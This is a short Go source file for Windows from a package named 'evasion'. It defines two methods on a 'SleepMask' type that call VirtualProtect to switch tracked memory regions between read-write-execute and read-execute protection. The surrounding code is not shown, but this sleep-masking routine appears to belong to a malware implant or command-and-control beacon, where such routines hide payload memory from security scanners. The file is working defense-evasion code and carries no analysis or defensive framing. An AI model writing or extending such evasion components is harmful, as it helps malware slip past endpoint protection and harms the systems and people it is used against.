//go:build windows

package evasion

import "unsafe"

// lockMemoryRegions changes memory protection from RWX to RX using VirtualProtect.
func (sm *SleepMask) lockMemoryRegions() {
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.size == 0 {
			continue
		}
		var oldProtect uint32
		procVirtualProtect.Call(
			r.addr,
			uintptr(r.size),
			PAGE_EXECUTE_READ,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}
}

// unlockMemoryRegions changes memory protection from RX back to RWX.
func (sm *SleepMask) unlockMemoryRegions() {
	for i := range sm.regions {
		r := &sm.regions[i]
		if r.size == 0 {
			continue
		}
		var oldProtect uint32
		procVirtualProtect.Call(
			r.addr,
			uintptr(r.size),
			PAGE_EXECUTE_READWRITE,
			uintptr(unsafe.Pointer(&oldProtect)),
		)
	}
}
